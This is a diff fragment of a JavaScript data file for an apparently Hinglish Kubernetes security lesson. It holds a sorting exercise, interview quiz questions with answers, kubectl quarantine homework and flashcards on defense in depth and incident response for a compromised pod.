+        instructions: 'Har ghatna ke liye socho: chaaron mein se kaun si deewar ise sabse pehle rok ya pakad leti?',
+        bins: [
+          { id: 'img', label: '📦 Image ki jaanch' },
+          { id: 'pol', label: '🛂 Admission policy' },
+          { id: 'rbac', label: '🪪 Least privilege' },
+          { id: 'rt', label: '🦅 Runtime nazar' },
+        ],
+        items: [
+          { text: 'Release hui image mein ek jaani hui CRITICAL kamzori thi', bin: 'img', explain: 'CI mein Trivy ka darwaza is image ko release hi nahi hone deta.' },
+          { text: 'Developer ne privileged: true wala pod deploy kar diya', bin: 'pol', explain: 'Yeh pod ke roop ka sawal hai. Admission policy darwaze par mana kar deti.' },
+          { text: 'Chori hue token se attacker ne namespace ke saare Secrets padh liye', bin: 'rbac', explain: 'Token ke paas "list secrets" hona hi galti thi. Least privilege mein yeh ijaazat hoti hi nahi.' },
+          { text: 'Chalte container ke andar kisi ne shell khol kar ek script utaari', bin: 'rt', explain: 'Image saaf, YAML sahi, token chhota — phir bhi andar ki harkat sirf runtime detection dekh sakta hai.' },
+          { text: 'Kisi ne registry mein bahar ki image chupke se daal di aur Deployment ne use chala liya', bin: 'img', explain: 'Signature ki jaanch: bina ChaiPay ke signature wali image darwaze par ruk jaati.' },
+          { text: 'notify pod seedha ledger ke database port se jud gaya, jabki notify ko database se koi kaam nahi', bin: 'rbac', explain: 'Least privilege sirf token nahi, network bhi hai: NetworkPolicy se notify database tak pahunch hi nahi sakta.' },
+        ],
+      },
+    ],
+    interview: {
+      title: 'Interview Round — poori suraksha',
+      instructions: 'Aakhri round. Interviewer ek hamle ki kahani sunna chahta hai — shuru se aakhir tak. 🎤',
+      questions: [
+        {
+          q: '"Defense in depth ka matlab apne shabdon mein samjhao, Kubernetes ki misaal ke saath."',
+          choices: [
+            'Ek hi bahut mazboot deewar banana, jaise sirf network firewall, taaki baaki ki zaroorat na pade',
+            'Kai alag deewarein — image jaanch, policy, least privilege, runtime nazar — ek toote toh agli roke',
+            'Har pod ko alag cluster mein chalana taaki koi pod doosre ko chhoo na sake',
+            'Saare logon ko cluster-admin dena taaki ghatna ke waqt koi ruke nahi',
+          ],
+          answer: 1,
+          explain: 'Koi ek deewar poori nahi hoti. Maqsad yeh hai ki attacker ko har kadam par ek nayi rukawat mile, aur har kadam shor kare. Sawal "kya koi ghusega" nahi, "ghusne ke baad use kya milega aur humein kab pata chalega".',
+        },
+        {
+          q: '"Tumne compromise hue pod par se label app hata diya. Isse do cheezein hui. Kaun si?"',
+          choices: [
+            'Pod turant delete ho gaya, aur uske logs S3 mein chale gaye',
+            'Pod ka token bekaar ho gaya, aur pod ka IP badal gaya',
+            'Pod Service ke Endpoints se nikla; ReplicaSet ne naya pod banaya',
+            'Pod ka network band ho gaya, aur node cordon ho gaya',
+          ],
+          answer: 2,
+          explain: 'Service aur ReplicaSet dono pods ko label se chunte hain. Label hatte hi: traffic band (Service), aur ginti poori karne ke liye naya pod (ReplicaSet). Network band karna alag kadam hai — NetworkPolicy.',
+        },
+        {
+          q: '"Ghatna ke baad tum kaise tay karte ho ki kaun se raaz (secrets) rotate karne hain?"',
+          choices: [
+            'Sirf woh raaz jinke baare mein log mein likha ho ki attacker ne padhe',
+            'Woh saare raaz jo compromise hue pod ka token ya pod ka network padh sakta tha',
+            'Koi nahi — agar attacker sirf miner chala raha tha toh raaz surakshit hain',
+            'Poori company ke saare raaz, har baar, bina kisi jaanch ke',
+          ],
+          answer: 1,
+          explain: 'Jo padha ja SAKTA tha, use padha hua maano. Daayra do cheezon se tay hota hai: pod ke mount kiye hue Secrets/env, aur token ki RBAC ijaazat (can-i --list). Isi liye least privilege ghatna ke din ghante bachata hai.',
+        },
+      ],
+    },
+    success: [
+      'Main compromise hue pod ko poore kram mein, commands ke saath, sambhal sakta hoon',
+      'Main bata sakta hoon ki kaun si deewar kaun sa hamla rokti hai',
+      'Main ghatna ke baad rotate hone wale raazon ka daayra nikaal sakta hoon',
+    ],
+    homework: `<p>Asli cluster par: <b>🧪 Real Lab 20 — pod ko quarantine karna</b> (Home → Real Cluster Labs). Wahan tum label aur NetworkPolicy ka asar khud dekhoge.</p>
+      <pre>kubectl label pod &lt;pod&gt; app- quarantine=true
+kubectl get endpoints &lt;svc&gt;          # pod ka IP gayab?
+kubectl get pods -L app,quarantine   # naya pod ban gaya?</pre>`,
+    cards: [
+      { front: 'Chaar suraksha deewarein?', back: '(1) Image ki jaanch (scan + signature) · (2) Admission policy · (3) Least privilege (RBAC + NetworkPolicy) · (4) Runtime nazar (Falco + jawab).' },
+      { front: 'Pod se label <code>app</code> hatane par do asar?', back: 'Pod Service ke Endpoints se bahar (traffic band), aur ReplicaSet naya pod banata hai (service chalti rehti hai).' },
+      { front: 'Ghatna ke baad kaun se raaz rotate karne hain?', back: 'Jo compromise hua pod padh <b>sakta</b> tha: mount kiye Secrets + token ki RBAC ijaazat (<code>can-i --list</code>).' },
+      { front: 'Ghatna ke baad ka sabse zaroori sudhaar (is kahani mein)?', back: 'CI mein image scan ka darwaza: CRITICAL (jiska fix hai) par build fail.' },
     ],
   },
 ]);
